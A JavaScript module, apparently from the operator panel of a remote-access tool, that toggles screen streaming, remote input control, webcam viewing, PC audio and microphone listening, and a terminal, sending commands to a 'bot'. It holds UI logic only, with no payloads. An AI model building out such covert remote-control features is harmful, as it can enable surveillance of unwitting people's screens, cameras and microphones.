// frontend/client_control/js/modules/ui/header.js
import { AppState } from '../core/states.js';

export function initHeaderControls() {
    const actions = [
        { id: 'btn-desktop-stream',  ref: AppState.desktop, key: 'observe', mod: 'ScreenWatch', cmds: ['start_stream', 'stop_stream'] },
        { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'InputForge',  cmds: ['start_control', 'stop_control'] },
        { id: 'btn-webcam-stream',   ref: AppState.webcam,  key: 'active',  mod: 'CamGaze',     cmds: ['start', 'stop'] },
        { id: 'btn-audio-pc',        ref: AppState.audio,   key: 'output',  mod: 'AudioPulse',  cmds: ['listen_pc_on', 'listen_pc_off'] },
        { id: 'btn-audio-mic',       ref: AppState.audio,   key: 'input',   mod: 'AudioPulse',  cmds: ['listen_mic_on', 'listen_mic_off'] }
    ];

    const toggleAction = (action, forceState = null, silent = false) => {
        const btn = document.getElementById(action.id);
        const newState = (forceState !== null) ? forceState : !action.ref[action.key];
        
        // Если состояние не меняется - ничего не делаем
        if (action.ref[action.key] === newState && forceState === null) return;

        action.ref[action.key] = newState;
        if (btn) btn.classList.toggle('active', newState);

        if (action.id === 'btn-desktop-control') {
            const canvas = document.getElementById('desktopCanvas');
            if (canvas) {
                canvas.classList.toggle('control-active', newState);
                if (newState) { canvas.focus(); canvas.tabIndex = 1; }
            }
        }

        // Отправляем команду боту, если режим не "молчаливый"
        if (!silent && window.sendToBot) {
            window.sendToBot(action.mod, newState ? action.cmds[0] : action.cmds[1]);
        }
    };

    const terminalBtn = document.getElementById('btn-terminal-toggle');
    const terminalOverlay = document.getElementById('terminal-overlay');
    
    if (terminalBtn && terminalOverlay) {
        terminalBtn.onclick = () => {
            const isHidden = terminalOverlay.classList.toggle('hidden');
            terminalBtn.classList.toggle('active', !isHidden);
        };
    }

    actions.forEach(a => {
        const el = document.getElementById(a.id);
        if (el) el.onclick = () => toggleAction(a);
    });

    window.syncModeResources = (mode) => {
        // 1. Скрываем терминал (терминал не трогаем на бэкенде, просто убираем UI)
        if (terminalOverlay) terminalOverlay.classList.add('hidden');
        if (terminalBtn) terminalBtn.classList.remove('active');

        // 2. Отправляем команды на остановку боту (silent = false)
        // Проверяем состояние, чтобы не слать stop, если оно уже false
        if (mode === 'webcam') {
            if (AppState.desktop.observe) toggleAction(actions[0], false, false);
            if (AppState.desktop.control) toggleAction(actions[1], false, false);
        } else if (mode === 'desktop') {
            if (AppState.webcam.active) toggleAction(actions[2], false, false);
        }
        // Звук (actions[3] и actions[4]) мы здесь не трогаем, как вы и просили.
    };
}